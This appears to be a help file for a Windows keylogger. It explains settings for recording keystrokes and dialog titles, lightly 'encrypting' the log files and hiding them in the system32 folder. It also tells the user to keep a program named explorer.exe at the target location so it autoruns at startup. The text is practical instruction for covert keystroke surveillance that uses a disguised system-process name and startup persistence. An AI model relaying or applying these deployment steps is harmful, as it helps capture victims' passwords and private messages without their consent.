## Setting.ini Help

setting.ini must be stored in "%SystemDrive%/Program Files/Common Files"

```
[LogSetting]
USEBS=1    	whether [BS] should print or remove last char.? when Backspace is pressed.
UseChildTitle=0	Whether Child dialogue box Title included in Log? (i.e, Open, Save As etc.)
EncCode=1	ASCII code of character from logfile will increased by EncCode during encryption.
extension=.txt	What extension should log file have?
TimerInt=65	Interval for keypress recognising Loop.
LogMode=1	0: New Logfile on each startup.	  1:New Logfile everyday.  2:Only One Logfile.
LogDir=d:\nilesh	Path to store logfiles. (Do not mean if LogSysDir=1)
LogSysDir=0	Whether Log should stored in system32 folder(system folder)? (If LogSysDir=0 then Logs stored at LogDir path.)
```

## explorer.exe HELP:
Keep this file in target location (permanent), and run it from that location itself. So it would autorun on startup from that location only.